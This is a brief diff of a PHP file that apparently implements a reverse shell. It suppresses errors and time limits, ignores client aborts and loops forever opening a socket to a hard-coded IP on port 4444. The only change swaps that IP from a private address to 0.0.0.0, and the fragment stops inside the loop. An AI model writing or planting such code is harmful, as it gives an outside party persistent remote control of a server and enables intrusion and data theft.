@@ -1,5 +1,5 @@
 <?php
-$ip='10.13.5.162';$port=4444;$url='http://'.$ip.':8888/';
+$ip='0.0.0.0';$port=4444;$url='http://'.$ip.':8888/';
 set_time_limit(0);error_reporting(0);ignore_user_abort(true);
 while(1){
     $s=@fsockopen($ip,$port,$en,$es,30);
